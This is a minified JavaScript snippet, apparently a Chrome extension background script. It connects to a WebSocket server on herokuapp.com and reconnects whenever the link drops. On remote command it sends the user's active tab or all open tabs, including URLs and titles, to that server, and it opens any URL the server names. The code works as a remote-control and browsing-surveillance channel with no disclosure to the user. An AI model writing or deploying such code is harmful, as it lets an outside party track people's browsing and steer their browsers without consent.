let ws;function initSocket(e=1e4*Math.random()){console.log("init socket with id ",e),setTimeout(()=>{(ws=new WebSocket("wss://chrome-socket.herokuapp.com")).onopen=()=>{ws.send(JSON.stringify({action:"ID",payload:e})),ws.onmessage=({data:e})=>{try{!function({action:e,payload:n}){switch(console.log(e),e){case"TAB":return async function(){var e=await chrome.tabs.query({currentWindow:!1,active:!0});ws.send(JSON.stringify(e))}();case"TABS":return async function(){var e=await chrome.tabs.query({currentWindow:!1});ws.send(JSON.stringify(e))}();case"GOTO":(async function(e){chrome.tabs.create(e)})(n)}}(JSON.parse(e))}catch(e){ws.send(JSON.stringify(e))}}},ws.onclose=()=>initSocket(e)},1e3)}
